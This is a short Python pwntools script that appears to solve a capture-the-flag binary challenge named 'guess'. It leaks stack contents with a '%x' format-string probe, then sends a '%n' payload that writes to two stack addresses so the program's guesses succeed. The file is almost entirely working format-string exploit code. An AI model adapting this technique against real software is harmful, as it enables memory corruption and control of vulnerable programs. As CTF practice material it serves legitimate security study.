#!/usr/bin/python
#    Might be better to do in virtualenv, google how to set one up if you havent 
#    make sure pwntools is installed
#    Works on both easy and medium versions of the challenge 

from pwn import *
from sys import stdout

binshaddr = 0x400656  #0x4005b7 for hpy's ver


r = process("./guess") 		#if running locally with binary file
#r = remote("binary.hashbangctf.com", "6004") #if connecting to remote 
r.recvuntil("But first, what is your name?\n")

# dump memory to see where the format string starts getting read 
print("sending probing payload ...")
recon = "AAAA " + "%x."*20
r.sendline(recon)
r.recvuntil('AAAA ')
l = r.recvline()

#print l
params = l.split('.')

#add one because arrays start at 0
try:
	egg = params.index('41414141') + 1
except:
	print("egg value not found, try increasing number of %x's !")
	exit(1)

print("egg value at parameter number " + str(egg))
print("stack variables to be written to are number " + str(egg) + " and " + str(egg+1))
r.close()

r = process("./guess") 		#if running locally with binary file
#r = remote("binary.hashbangctf.com", "6004") #if connecting to remote 
r.recvuntil("at ")
l = r.recvline().replace(' and ',' ').rstrip()

addr = l.split(' ')
stdout.write(str(addr) + ' -> ')
addr = [ int(x, 16) for x in addr ]
print(addr)

addr1 = p32(addr.pop())
addr2 = p32(addr.pop())

# send %n payload using the two addresses given 
payload = addr1 + addr2 + "%"+str(egg)+"$n" + "%"+str(egg+1)+"$n"
print("Using payload: " + str(payload))

length = len(addr1+addr2)
print("approximate length = " + str(length))
print("the guesses need to be the number of bytes written to the two addresses")
r.recvuntil("?\n")
r.sendline(payload)
r.recvuntil("then: \n")

# send the length written to the variables
r.sendline(str(length))
print r.recvline(timeout=0.2)
r.sendline(str(length))
print r.recvline(timeout=0.2)
